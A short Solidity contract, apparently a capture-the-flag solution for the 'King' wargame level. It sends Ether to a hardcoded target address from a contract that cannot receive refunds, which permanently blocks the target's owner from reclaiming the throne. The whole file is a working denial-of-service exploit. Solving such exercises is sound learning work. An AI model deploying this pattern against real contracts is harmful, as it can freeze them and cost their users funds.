// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

/** 
    @title Hacker contract for King
    @notice We become king by sending an amount over the prize. 
            By using another smart contract to interact with the King contract, 
            we prevent the owner of King to become king since our smart contract doesn't have a fallback function to receive Ether (the tx will fail). 
*/

contract HackKing {
    address toHack = 0x2753482cE9742904B285F897f81E62Aa673b15b6;

    function becomeKing() external payable {
        (bool result, ) = toHack.call{value: msg.value}("");
        require(result, "Failed to become king");
    }
}

// prize = 0.001 Ether
